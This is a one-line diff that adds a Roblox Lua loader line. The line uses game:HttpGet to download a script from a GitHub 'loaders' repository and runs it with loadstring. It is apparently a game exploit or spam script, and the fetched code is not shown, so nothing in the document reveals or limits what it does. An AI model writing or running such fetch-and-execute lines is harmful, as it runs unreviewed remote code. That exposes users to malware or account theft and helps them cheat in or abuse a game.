@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/vanguards-2nd-anniversary-spam3-3i3bp601o4batr.lua"))()
